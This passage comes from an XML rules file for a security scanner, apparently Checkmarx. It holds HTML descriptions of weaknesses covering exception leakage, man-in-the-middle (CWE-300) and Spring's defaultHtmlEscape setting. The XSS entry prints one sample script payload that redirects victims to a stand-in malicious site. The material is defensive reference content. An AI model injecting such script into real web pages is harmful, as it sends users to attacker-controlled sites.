&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application generates an error message including raw exceptions, either by not being handled, by explicit returning of the object, or by configuration. Exception details may include sensitive information that could leak out of the exception to the users.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ol&gt;
&lt;li&gt;Any method that could cause an exception should be wrapped in a try-catch block that:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Explicitly handles expected exceptions.&lt;/li&gt;
&lt;li&gt;Includes a default solution to explicitly handle unexpected exceptions.&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Configure a global handler to prevent unhandled errors from leaving the application.&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
Do not reveal exception details, instead always return a static message.

      &lt;/h4&gt;&lt;pre&gt;


try
{
// Database access or other potentially dangerous function
}
catch (SqlException ex)
{
LogException(ex);
Response.Write("Error occurred.");
}



      &lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;
Do not reveal exception details, instead always return a static message.

      &lt;/h4&gt;&lt;pre&gt;


try
{
// Database access or other potentially dangerous function
}
catch (SqlException ex)
{
LogException(ex);
Response.Write("Error occurred.");
}


      &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1639</key><name>Channel_Accessible_by_NonEndpoint</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Channel Accessible by Non-Endpoint ('Man-in-the-Middle')&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;300&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Class)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_300_Description" id="oc_300_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The product does not adequately verify the identity of actors
at both ends of a communication channel, or does not adequately ensure the
integrity of the channel, in a way that allows the channel to be accessed or
influenced by an actor that is not an endpoint.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;In order to establish secure communication between two parties, it is
often important to adequately verify the identity of entities at each end of
the communication channel. Failure to do so adequately or consistently may
result in insufficient or incorrect identification of either communicating
entity. This can have negative consequences such as misplaced trust in the
entity at the other end of the channel. An attacker can leverage this by
interposing between the communicating entities and masquerading as the
original entity. In the absence of sufficient verification of identity, such
an attacker can eavesdrop and potentially modify the communication between
the original entities.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_300_Time of Introduction" id="oc_300_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_300_Applicable Platforms" id="oc_300_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;All&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_300_Demonstrative Examples" id="oc_300_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;In the Java snippet below, data is sent over an unencrypted channel
to a remote server. By eavesdropping on the communication channel or posing
as the endpoint, an attacker would be able to read all of the transmitted
data.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Java&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;Socket sock;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;PrintWriter out;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;try {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;sock = new Socket(REMOTE_HOST, REMOTE_PORT);&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;out = new PrintWriter(echoSocket.getOutputStream(),
true);&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;// Write data to remote host via socket output stream.&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;...&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_300_Potential Mitigations" id="oc_300_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Always fully authenticate both ends of any communications
channel.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Adhere to the principle of complete mediation.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;A certificate binds an identity to a cryptographic key to authenticate
a communicating party. Often, the certificate takes the encrypted form
of the hash of the identity of the subject, the public key, and
information such as time of issue or expiration using the issuer's
private key. The certificate can be validated by deciphering the
certificate with the issuer's public key. See also X.509 certificate
signature chains and the PGP certification structure.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_300_Relationships" id="oc_300_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;287&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=287" target="_blank"&gt;Improper Authentication&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;PeerOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;602&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=602" target="_blank"&gt;Client-Side Enforcement of Server-Side Security&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;PeerOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;603&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=603" target="_blank"&gt;Use of Client-Side Authentication&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_300_Taxonomy Mappings" id="oc_300_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;PLOVER&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Man-in-the-middle (MITM)&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;WASC&lt;/td&gt;&lt;td valign="top"&gt;32&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Routing Detour &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Related Attack Patterns"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Related Attack Patterns&lt;/div&gt;&lt;div name="oc_300_Related Attack Patterns" id="oc_300_Related Attack Patterns" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;CAPEC-ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Attack Pattern Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;&lt;div style="font-weight:normal; font-size:85%; font-style:italic; color:#000000"&gt;(CAPEC Version: 1.5)&lt;/div&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org94.html" target="_blank"&gt;94&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Man in the Middle Attack&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org57.html" target="_blank"&gt;57&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Utilizing REST's Trust in the System Resource to Register Man in the Middle&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="References"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;References&lt;/div&gt;&lt;div name="oc_300_References" id="oc_300_References" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;M. Bishop. "Computer Security: Art and Science". Addison-Wesley. 2003. &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Maintenance Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Maintenance Notes&lt;/div&gt;&lt;div name="oc_300_Maintenance Notes" id="oc_300_Maintenance Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;The summary identifies multiple distinct possibilities, suggesting that
this is a category that must be broken into more specific weaknesses.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_300_Content History" id="oc_300_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;PLOVER&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Sean Eidemiller&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;added/updated demonstrative
examples&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description, Maintenance Notes, Relationships,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-05-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Name&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2010-02-16&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Previous Entry Names&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Change Date&lt;/th&gt;&lt;th valign="top" nowrap="" colspan="3"&gt;Previous Entry
Name&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2008-04-11&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Man-in-the-middle
(MITM)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2009-05-27&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Channel Accessible by
Non-Endpoint (aka 'Man-in-the-Middle')&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1389</key><name>Spring_defaultHtmlEscape_Not_True</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;   &lt;link href="main.css" rel="stylesheet" type="text/css"&gt;   &lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;
          &lt;span style="font-weight:bold;color:white;"&gt;
          &lt;span style="font-size: small; font-family: Verdana; mso-fareast-font-family: Calibri; mso-fareast-theme-font: minor-latin; mso-ansi-language: EN-US; mso-fareast-language: EN-US; mso-bidi-language: HE"&gt;
          Spring default Html Escape Not True&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;    &lt;span class="tool"&gt;&lt;/span&gt;    &lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;
          Weakness ID: 10711&lt;/b&gt;&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Base)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_90_Description" id="oc_90_Description" class="expandblock"&gt;&lt;div class="detail"&gt;  &lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;
          &lt;span style="color: rgb(0, 0, 0); font-family: Verdana; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 19px; orphans: 2; text-align: -webkit-auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); display: inline !important; float: none;"&gt;
          If the &amp;quot;defaultHtmlEscape&amp;quot; is set to false&lt;span class="Apple-converted-space"&gt;&lt;span style="color: rgb(0, 0, 0); font-family: Verdana; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 19px; orphans: 2; text-align: -webkit-auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); display: inline !important; float: none;"&gt;,
          data received as an input may not be escaped and potentialy exposing the
          application to XSS attacks.&lt;br&gt;
          &lt;/span&gt;&lt;/span&gt;
          &lt;/span&gt;&lt;/div&gt;  &lt;p class="subheading"&gt;
              Extended Description&lt;/p&gt;
          &lt;div class="indent"&gt;
              &lt;span class="style4" style="font-family: Verdana; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 21px; orphans: 2; text-align: justify; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); display: inline !important; float: none;"&gt;
              Escaping ensures that charecters are not treated as relevant to the
              interperter&amp;#39;s parser, but rather treated as data, and by this preventing&amp;nbsp;
              XSS attacks.&lt;br&gt;
              If there is a proper escaping, malicious input script will not be executed.&lt;br&gt;
              &lt;/span&gt;&lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_90_Time of Introduction" id="oc_90_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;
              &lt;ul&gt;
                  &lt;li&gt;Implementation&lt;/li&gt;
              &lt;/ul&gt;
              &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_90_Applicable Platforms" id="oc_90_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;  &lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;  &lt;p&gt;
              All&lt;/p&gt;  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_90_Demonstrative Examples" id="oc_90_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;
              Example:&lt;/p&gt;
              &lt;p&gt;
                  The following example in HTML shows us a basic mechanism of receiveng an input
                  from a user and submitting it in a form:&lt;/p&gt;
              &lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example  Language:&lt;/span&gt;HTML&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div class="style2"&gt;
                      &lt;pre style="padding-top: 1em; padding-right: 1em; padding-bottom: 1em; padding-left: 1em; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px; border-top-style: dashed; border-right-style: dashed; border-bottom-style: dashed; border-left-style: dashed; border-top-color: rgb(47, 111, 171); border-right-color: rgb(47, 111, 171); border-bottom-color: rgb(47, 111, 171); border-left-color: rgb(47, 111, 171); border-image: initial; color: rgb(0, 0, 0); background-color: rgb(255, 255, 255); line-height: 1.1em; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: -webkit-auto; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; "&gt;&lt;span class="style6"&gt;&amp;lt;form name=&amp;quot;input&amp;quot; action=&amp;quot;submitted.jsp&amp;quot; method=&amp;quot;get&amp;quot;&amp;gt; &lt;/span&gt;
&lt;span class="style6"&gt;Username: &lt;/span&gt;
&lt;span class="style6"&gt;&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;user&amp;quot; /&amp;gt; &lt;/span&gt;
&lt;span class="style6"&gt;&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Submit&amp;quot; /&amp;gt; &lt;/span&gt;
&lt;span class="style6"&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;&lt;/pre&gt;
                      &lt;/div&gt;
                  &lt;/div&gt;&lt;/div&gt;
                  &lt;p&gt;
                      The following line can be submittedd by a malicious user:&lt;br&gt;
                  &lt;/p&gt;
                  &lt;p class="style7"&gt;
                      &amp;lt;script&amp;gt;window.location.href=&amp;quot;www.someMaliciousSite.com&amp;quot;&amp;lt;/script&amp;gt;&lt;/p&gt;
                  &lt;p class="style5"&gt;
                      &amp;nbsp;&lt;/p&gt;
                  &lt;p class="style5"&gt;
